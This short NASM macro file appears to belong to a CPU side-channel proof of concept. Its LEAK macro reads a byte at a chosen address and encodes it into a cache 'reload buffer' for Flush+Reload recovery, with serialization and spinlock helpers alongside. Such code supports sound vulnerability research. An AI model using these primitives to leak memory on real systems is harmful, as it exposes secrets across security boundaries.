%define LEAK_MASK       (LEAK_SIZE-1)

;Macro to insert LEAK_SIZE load operations to hit the reload buffer
;Usage: LOADS <reg> where reg points to the reload buffer
%macro LOADS 1
    %assign i 0
    %rep LEAK_SIZE
        mov rax, [%1+i]
        %assign i i+STRIDE
    %endrep
%endmacro

;Usage LEAK <reg1>, <reg2> where reg1=reload_buf, reg2=addr_to_leak
%macro LEAK 2
    movzx   rax, byte [%2]
    and     rax, LEAK_MASK
    shl     rax, STRIDE_LOG
    mov     rax, qword [%1+rax]
%endmacro

;Macro to force serialization
%macro SERIALIZE 0
    push rax
    push rbx
    push rcx
    push rdx
    xor rax, rax
    cpuid
    pop rdx
    pop rcx
    pop rbx
    pop rax
    mfence
%endmacro

;spin lock until the mutex is retrieved
%macro GET_LOCK 1
%%xmc_get_lock:
    mov     eax, 1
    mov     ecx, 0
    lock cmpxchg [%1], ecx
    jnz    %%xmc_get_lock
%endmacro

;relase mutex
%macro RELEASE_LOCK 1
%%xmc_rel_lock:
    mov     eax, 0
    mov     ecx, 1
    lock cmpxchg [%1], ecx
    jnz    %%xmc_rel_lock
%endmacro

